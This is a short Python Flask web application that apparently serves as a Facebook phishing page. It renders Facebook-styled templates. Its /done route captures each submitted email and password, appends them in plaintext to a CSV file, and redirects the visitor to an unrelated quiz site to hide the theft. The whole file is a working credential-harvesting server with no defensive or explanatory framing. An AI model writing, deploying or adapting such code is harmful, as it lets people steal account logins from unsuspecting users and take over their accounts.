# -*- coding: utf-8 -*-
from flask import Flask
from flask import render_template, request,jsonify,redirect,url_for
import csv
app = Flask(__name__)

@app.route('/')
def home():
    return render_template("home.html")

@app.route('/facebook')
def facebook():
    return render_template("facebook.html")

@app.route('/facebook-form')
def facebook_form():
    return render_template("facebook-form.html")

@app.route('/done',methods=['GET','POST'])
def done():
    email = request.form['email']
    password = request.form['pass']
    with open('test.csv', 'a') as csvfile:
        writer = csv.writer(csvfile, lineterminator='\n')
        writer.writerow([email, password])
    return redirect("https://www.zenquiz.net/vn/pquiz/ban-la-ai-trong-tam-quoc-dien-nghia-UIDjnOBygMQVtyik4PH", code=302)

@app.route('/ajax',methods=['GET','POST'])
def ajax():
    return jsonify({"url":"/facebook-form"})

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8080)
